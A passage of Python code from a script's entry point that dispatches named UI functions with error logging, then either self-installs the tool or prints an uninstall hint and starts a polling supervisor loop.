            if fn:
                fn(*args)
            else:
                log.error(f"Unknown UI fn: {fn_name}")
        except Exception as e:
            log.error(f"UI subprocess error: {e}")
        sys.exit(0)

    if not is_installed():
        self_install()
    else:
        print_uninstall_hint()
        _poll_loop_supervisor()
